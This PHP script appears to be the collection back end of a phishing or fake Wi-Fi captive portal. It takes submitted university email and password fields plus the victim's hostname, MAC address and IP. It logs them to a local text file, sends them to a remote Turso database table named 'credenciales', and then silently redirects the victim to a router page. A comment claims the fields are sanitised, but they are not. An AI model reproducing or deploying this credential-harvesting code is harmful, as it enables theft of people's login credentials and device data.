<?php
require_once 'env.php';
load_env(__DIR__ . '/.env');

$url   = $_ENV['TURSO_URL']        ?? '';
$token = $_ENV['TURSO_AUTH_TOKEN'] ?? '';

// Sanitizar campos del POST
$email    = $_POST['email_uade']    ?? '';
$password = $_POST['password_uade'] ?? '';
$hostname = $_POST['hostname']      ?? '';
$mac      = $_POST['mac']           ?? '';
$ip       = $_POST['ip']            ?? '';
$target   = $_POST['target']        ?? '';

// Guardar en archivo de texto local
$file = 'datos.txt';
file_put_contents($file, print_r($_POST, true), FILE_APPEND);

// Insertar en Turso
$payload = json_encode([
    'statements' => [
        [
            'q'      => 'INSERT INTO credenciales (email_uade, password_uade, hostname, mac, ip, target) VALUES (?, ?, ?, ?, ?, ?)',
            'params' => [$email, $password, $hostname, $mac, $ip, $target],
        ]
    ]
]);

$ch = curl_init($url . '/v2/pipeline');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $payload,
    CURLOPT_HTTPHEADER     => [
        'Authorization: Bearer ' . $token,
        'Content-Type: application/json',
    ],
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    error_log('Turso error (' . $httpCode . '): ' . $response);
}

header('Location: http://192.168.1.1/');
exit;